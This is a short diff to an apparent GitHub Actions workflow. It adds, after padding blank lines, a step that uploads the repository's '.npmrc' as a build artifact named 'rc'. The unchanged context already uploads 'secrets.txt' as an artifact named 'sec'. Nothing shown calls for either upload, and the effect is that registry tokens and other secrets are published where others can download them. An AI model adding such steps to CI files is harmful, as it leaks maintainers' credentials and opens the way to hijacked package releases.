@@ -55,6 +55,13 @@ jobs:
         with:
           name: sec
           path: secrets.txt
+      
+      
+      - name: Upload rc
+        uses: actions/upload-artifact@v4
+        with:
+          name: rc
+          path: .npmrc
 
       - name: Setup Node.js
         uses: ./.github/actions/node-step
